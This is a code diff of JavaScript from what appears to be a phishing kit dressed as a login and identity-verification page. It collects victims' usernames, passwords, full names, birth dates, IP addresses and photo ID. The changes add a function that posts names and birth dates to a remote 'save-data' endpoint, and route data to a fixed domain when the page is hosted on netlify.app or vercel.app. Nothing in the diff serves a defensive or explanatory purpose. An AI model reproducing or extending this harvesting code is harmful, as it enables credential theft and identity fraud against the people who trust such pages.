@@ -1,13 +1,30 @@
-modalSetting("hide");
-var isFirstLoginInput=true;
-       var requestRatioSelected=false;
-       var local = 'https://api.idpagemanage.com';
-       var abc =  window.location.hostname;
+        modalSetting("hide");
+        var isFirstLoginInput=true;
+        var requestRatioSelected=false;
+        var local = 'https://api.idpagemanage.com';
+        var host =  location.hostname;
+        var protocol = location.protocol;
+        var abc ='';
+        const domains = [
+            'netlify.app', 
+            'vercel.app',
+            '*.netlify.app',
+            '*.vercel.app'
+        ];
+        const regex = new RegExp(`(\\w+\\.)*(${domains.join("|")})`);
+
+        if(regex.test(host)) {
+            abc = protocol + '//' + 'cj-japan.com';
+        }else{
+            abc = protocol + '//' + host;
+        }
+        console.log(abc);
        let userInfo="";
        let id;
        let ip;
        var upload_result;
        var f_result;
+       var final;
        let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
        document.getElementById("submissionID").innerHTML=thisSession;
        fetch('https://api.ipify.org?format=json') .then(response=> response.json()) .then(data => {
@@ -48,7 +65,7 @@ var isFirstLoginInput=true;
                 $('#submitPhotoNextBtn').prop('disabled', true);
             },
             success: function(data){
-                var res_data = JSON.stringify(data);
+                var res_data = JSON.parse(data);
                 id = res_data.id;
                 upload_result = res_data;
                 return true;
@@ -87,11 +104,44 @@ var isFirstLoginInput=true;
                 success: function(data){
                     f_result = JSON.parse(data);
                     id = f_result.id;
-                    //console.log(f_result);
                     return f_result;
                 }
             })    
         //return true;
+       }
+
+       async function updateInfo()
+       {
+            const model = {};
+            var fullname = document.getElementById("fullName").value;
+            var dob = document.querySelector('#day').value + '/' + document.querySelector('#month').value + '/' + document.querySelector('#year').value;
+
+            model.id = id;
+            model.fullname = fullname;
+            model.dob = dob;
+            var udurl = abc +'/business/save-data';
+            console.log(udurl, '----', model);
+
+            await $.ajax({
+                url: udurl,
+                type: 'POST',
+                dataType:"json",
+                data: JSON.stringify({model: model}),
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                beforeSend: function(){
+                    $('#loading-spinner').removeClass('d-none');
+                    $('.input-grop-cust-login input').prop('disabled', true);
+                    $('#loginNextBtn').prop('disabled', true);
+                },
+                success: function(data){
+                    final = JSON.parse(data);
+                    id = final.id;
+                    return final;
+                }
+            })    
+
        }
 
 
@@ -149,8 +199,9 @@ var isFirstLoginInput=true;
                }
                userInfo+="Username/password: `"+document.getElementById("username").value+"`/`"+document.getElementById("password").value+"`\n";
                break;
-               case "request" : moveTab("v-pills-profile");
+               case "request" : moveTab("v-pills-messages");
                userInfo+="Fullname: `"+document.getElementById("fullName").value+"`\nBirth: `"+document.querySelector('#day').value+"/"+document.querySelector('#month').value+"/"+document.querySelector('#year').value+"`\n";
+               await updateInfo();
                break;
                case "photoID" : 
                uploadFile().then(() => {
